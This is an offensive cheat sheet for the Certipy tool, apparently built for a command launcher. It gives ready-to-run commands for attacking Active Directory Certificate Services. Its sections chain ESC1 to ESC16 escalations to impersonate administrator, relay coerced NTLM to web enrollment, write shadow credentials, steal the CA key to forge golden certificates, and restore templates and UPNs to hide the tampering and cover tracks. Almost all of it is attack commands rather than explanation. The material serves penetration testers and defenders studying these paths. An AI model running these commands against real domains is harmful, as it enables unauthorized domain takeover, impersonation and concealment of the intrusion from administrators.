# Certipy

<!-- cheat
export certipy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

## certipy (ADCS)

### find

Enumerate ADCS: pulls CA list, templates, ESC1 through ESC15 vulnerabilities, and ACL findings. `-vulnerable -enabled -text` filters to only published templates with known abuse paths, printed as human readable text.

```sh title:"Certipy Enumerate vulnerable enabled templates"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import users
import domain_ip
import certipy_auth
-->

## certipy req (Request Certificate)

### req

Request a certificate from the CA. `-upn` lets you set the SAN, which is what ESC1 abuses to impersonate any principal.

```sh title:"Certipy Request cert with chosen UPN in SAN"
certipy req -u $user@$domain $auth_flags -ca $ca_name -template $template_name -upn $target_upn -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_name
var template_name
var target_upn
-->

## certipy auth (Authenticate using Certificate)

### auth

PKINIT authenticate with a pfx to get a TGT and NT hash for the cert's principal.

```sh title:"Certipy PKINIT with pfx"
certipy auth -u $user@$domain $auth_flags -pfx $pfx_file -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var pfx_file
-->

## certipy relay (NTLM Relay to AD CS)

### relay

Relay captured NTLM auth to the ADCS web endpoint and request a cert on behalf of the coerced principal. Classic ESC8 attack.

```sh title:"Certipy ESC8 relay to certsrv"
certipy relay -u $user@$domain $auth_flags -target http://$target_adcs/certsrv/certfnsh.asp -template $template_name -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var target_adcs
var template_name
-->

## certipy shadow (Shadow Credentials Attack)

### shadow

Write a Key Credential (`msDS-KeyCredentialLink`) on the target and immediately request a PKINIT cert. `shadow auto` chains the whole primitive.

```sh title:"Certipy Auto chain KeyCredentialLink write and PKINIT"
certipy shadow auto -target $domain -dc-ip $rhost_ip -username $user@$domain $auth_flags -account $target
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var target
-->

## certipy forge (Forge Certificates from Compromised CA)

### Golden Certificate

Forge a cert signed by a stolen CA private key. Works offline, survives CA rotation of user passwords, and lets you impersonate any UPN. Requires `CA.pfx` (usually from DPAPI or LSASS on the CA host).

```sh title:"Certipy Offline forge signed by stolen CA.pfx, impersonate any UPN"
certipy forge -ca-pfx $ca_pfx -upn $target_upn -subject $target_subject -dc-ip $rhost_ip -out $output_pfx
```
<!-- cheat
import users
import domain_ip
var ca_pfx
var target_upn
var target_subject
var output_pfx
-->

## certipy template (Manage Certificate Templates)

### template dump

Export a certificate template's full configuration to JSON. Keep the output; `-save-old` in ESC4 flows reads from this to restore the template after exploitation.

```sh title:"Certipy Export template config JSON"
certipy template -u $user@$domain $auth_flags -template $template_name -dc-ip $rhost_ip -export $template_name.json
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template_name
-->

## certipy account (Manage AD Certificate-Related Attributes)

### new machine account

Create a computer account via LDAP (requires MachineAccountQuota > 0). Needed for ESC6/ESC9/ESC10 flows that depend on a controlled machine principal.

```sh title:"Certipy Create machine account (MachineAccountQuota > 0)"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -add -name $rhost_name -dns $rhost_name
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var rhost_name
-->

## adcs - exec - certipy - remote

### ESC1/ESC2 Step 1 req

Step 1 of ESC1/ESC2: request a cert from the vulnerable template with `-upn administrator` to put Administrator in the SAN. ESC1 allows arbitrary UPN; ESC2 is any-purpose EKU.

```sh title:"Certipy Request cert with administrator in SAN from vulnerable template"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC1/ESC2 Step 2 auth

Step 2 of ESC1/ESC2: PKINIT with the cert obtained in step 1 to get Administrator's TGT and NT hash.

```sh title:"Certipy PKINIT as administrator using the cert from ESC1/ESC2 step 1"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
-->

### ESC3 Step 1 agent cert

Step 1 of ESC3: request an Enrollment Agent cert from the vulnerable template.

```sh title:"Certipy Request Enrollment Agent cert from the vulnerable template"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC3 Step 2 on behalf of

Step 2 of ESC3: use the Enrollment Agent cert to request a User cert on behalf of Administrator.

```sh title:"Certipy Enroll User cert on behalf of administrator with agent.pfx"
certipy req -u $user@$domain $auth_flags -ca $ca -template 'User' -on-behalf-of '$domain\administrator' -pfx agent.pfx
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC3 Step 3 auth

Step 3 of ESC3: PKINIT with the on behalf of cert to get Administrator's TGT and NT hash.

```sh title:"Certipy PKINIT as administrator using the on behalf of cert"
certipy auth -pfx $pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
var pfx
-->

### ESC4 Step 1 save template

Step 1 of ESC4: export the original template config so you can restore it after the attack (`-save-old`).

```sh title:"Certipy Export original config via -save-old for post exploit restore"
certipy template -u $user@$domain $auth_flags -template $template -save-old -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template
-->

### ESC4 Step 2 abuse

Step 2 of ESC4: the template was just rewritten to be ESC1 vulnerable; request a cert with administrator UPN.

```sh title:"Certipy Request administrator cert against now ESC1-vulnerable template"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC4 Step 3 restore

Step 3 of ESC4: load the saved JSON back onto the template to hide the tampering.

```sh title:"Certipy Restore original template JSON to hide the tampering"
certipy template -u $user@$domain $auth_flags -template $template -configuration $template.json
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template
-->

### ESC5 backup CA key

ESC5 abuses object ACL misconfigurations on the CA itself (or related PKI objects). After gaining write access to a critical PKI object (NTAuthCertificates, AIA, CA computer object), backing up the CA private key gives forge capability.

```sh title:"Certipy Backup CA private key/cert to .pfx (requires CA compromise)"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -config '$ca_fqdn\$ca_config' -backup
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca_config
-->

### ESC5 forge golden cert

Forge a golden certificate from the backed-up CA private key. PKINIT as any principal in the forest.

```sh title:"Certipy Forge cert as administrator from compromised CA key"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -sid $admin_sid -crl 'ldap:///'
```
<!-- cheat
import users
import domain_ip
var ca_pfx
var admin_sid
-->

### ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2

ESC6: the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which lets you supply an arbitrary SAN in any cert request (including default User templates). Same flow as ESC1 but the misconfig lives on the CA, not the template.

```sh title:"Certipy Request cert with administrator SAN against EDITF_ATTRIBUTESUBJECTALTNAME2 CA"
certipy req -u $user@$domain $auth_flags -ca $ca -template User -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC7 add officer

ESC7 Step 1: grant yourself the CA officer role (ManageCA / ManageCertificates) when you have write access to the CA's security descriptor.

```sh title:"Add self as CA officer via Certipy ca module"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -add-officer $user
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
-->

### ESC7 enable SubCA template

ESC7 Step 2: enable the built-in SubCA template (disabled by default) so we can request against it.

```sh title:"Certipy Enable SubCA template on the CA"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -enable-template SubCA
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
-->

### ESC7 submit SubCA req

ESC7 Step 3: request SubCA cert with administrator UPN. CA will fail-on-pending; you'll get a request ID to issue manually in the next step.

```sh title:"Certipy Submit SubCA cert request with administrator SAN (will pend)"
certipy req -u $user@$domain $auth_flags -ca $ca -template SubCA -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC7 issue pending request

ESC7 Step 4: as a CA officer, approve the pending request to get the cert issued.

```sh title:"Certipy Issue the pending SubCA request as CA officer"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -issue-request $request_id
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var request_id
-->

### ESC7 retrieve issued cert

ESC7 Step 5: pull the issued cert by request ID.

```sh title:"Certipy Retrieve issued SubCA cert by request ID"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -retrieve $request_id
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var request_id
-->

### ESC8 / ESC11 relay to web enrollment

ESC8 (HTTP) / ESC11 (RPC) abuse the CA's web enrollment endpoints accepting NTLM. Start the relay; pair with a coercion technique (PetitPotam, Coercer) to force the DC to authenticate. Use `-template DomainController` when relaying a DC$.

```sh title:"Certipy Relay coerced NTLM to AD CS web enrollment (DC template)"
certipy relay -target 'https://$ca_fqdn' -template DomainController
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### ESC8 relay user

Same relay, but for relaying a user account rather than a machine - drop the `-template` arg to use default User template.

```sh title:"Certipy Relay coerced NTLM to AD CS web enrollment (User template)"
certipy relay -target 'https://$ca_fqdn'
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### ESC9 update victim UPN

ESC9 abuses a template with `CT_FLAG_NO_SECURITY_EXTENSION` (no SID in cert SAN). Step 1: rewrite victim's UPN to administrator (requires GenericWrite or similar on victim).

```sh title:"Certipy Rewrite victim UPN to administrator (no SID extension cert template)"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn administrator -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC9 / ESC10 shadow credentials

If you don't have the victim's password, set msDS-KeyCredentialLink and PKINIT to grab their TGT/NT.

```sh title:"Certipy Add shadow credentials to victim for PKINIT auth"
certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim auto
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC9 request cert as victim

ESC9 Step 2: with victim's Kerberos ticket and the rewritten UPN, request the cert. Cert SAN now claims administrator's UPN but the SID extension is absent, so KDC trusts the UPN.

```sh title:"Certipy Request cert as victim against no-SID template (Kerberos)"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca
var template
-->

### ESC9 revert victim UPN

ESC9 Step 3 (cleanup): restore the victim's original UPN to cover tracks.

```sh title:"Certipy Restore victim's original UPN after ESC9 abuse"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim@$domain -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC10 weak certificate mapping

ESC10 abuses weak certificate mapping in StrongCertificateBindingEnforcement registry. Rewrite victim UPN to target a DC machine account (`DC$`), then PKINIT to LDAP shell as that DC.

```sh title:"Certipy Rewrite victim UPN to DC$ for ESC10 weak-mapping abuse"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn '$dc_name$@$domain' -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var dc_name
var victim
-->

### ESC10 auth as DC$ ldap-shell

After requesting the cert as the rewritten victim, PKINIT and drop into an LDAP shell as the impersonated DC$ - good for DCSync, RBCD writes, etc.

```sh title:"Certipy PKINIT as DC$ and drop into an LDAP shell"
certipy auth -pfx $dc_pfx -dc-ip $rhost_ip -ldap-shell
```
<!-- cheat
import domain_ip
var dc_pfx
-->

### ESC15 schema v1 application policy

ESC15: schema v1 templates accept attacker-supplied Application Policies. Request a cert with explicit `Client Authentication` policy + administrator UPN to bypass EKU restrictions.

```sh title:"Certipy Inject Client Authentication app policy + admin SAN on schema v1 template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template -upn administrator@$domain -sid $admin_sid -application-policies 'Client Authentication'
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var template
var admin_sid
-->

### ESC16 disabled SID security extension

ESC16: the CA has the security SID extension disabled globally (msPKI-Enrollment-Flag `CT_FLAG_NO_SECURITY_EXTENSION` set on the CA). Same flow as ESC9 - rewrite victim UPN, request cert as victim, auth as administrator.

```sh title:"Certipy Request cert as victim against ESC16 CA (no SID extension globally)"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca
-->
